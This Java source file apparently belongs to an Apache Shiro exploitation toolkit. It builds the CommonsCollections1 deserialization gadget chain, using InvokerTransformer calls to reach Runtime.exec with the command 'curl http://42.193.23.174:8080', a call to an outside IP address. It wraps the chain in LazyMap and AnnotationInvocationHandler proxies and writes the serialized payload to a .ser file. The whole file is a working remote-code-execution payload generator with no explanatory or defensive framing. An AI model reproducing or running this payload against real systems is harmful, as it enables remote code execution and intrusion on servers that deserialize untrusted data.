package shiro.gadgets.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import shiro.gadgets.commons.Serializer1;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {
    public static void commonscollections1() throws Exception {
        org.apache.commons.collections.Transformer[] transformers = new org.apache.commons.collections.Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"curl http://42.193.23.174:8080"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        InvocationHandler annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);
        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);

        Serializer1.serializer("src/main/resources/cc1.ser",annotationInvocationHandler);

    }

}
